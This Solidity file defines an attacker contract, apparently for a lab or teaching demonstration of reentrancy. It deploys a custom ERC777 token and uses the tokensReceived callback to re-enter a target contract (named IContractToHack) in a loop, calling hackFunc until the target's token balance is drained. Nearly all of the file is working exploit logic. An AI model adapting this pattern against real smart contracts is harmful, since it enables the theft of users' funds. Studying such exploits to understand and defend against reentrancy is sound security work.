// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "./ReentrantToken.sol";

interface IContractToHack {
    function getTokenBalance() external view returns (uint256);

    function assignToken(address reentryToken) external;

    function hackFunc() external;
}

contract AttackerContractReentrant is IERC777Recipient {
    IContractToHack _contractToHack;
    ERC777 _token;

    constructor(address contractToHack, uint256 totalSupply) {
        _contractToHack = IContractToHack(contractToHack);
        _token = new ReentrantToken(totalSupply);
        _contractToHack.assignToken(address(_token));
    }

    function tokensReceived(
        address /*operator*/,
        address from,
        address /*to*/,
        uint256 /*amount*/,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external override {
        // reentrancy into contractToHack initiated here
        // _balances[from] += amount;
        if (from == address(_contractToHack)) {
            while (_contractToHack.getTokenBalance() > 0)
                _contractToHack.hackFunc();
        }
    }
}
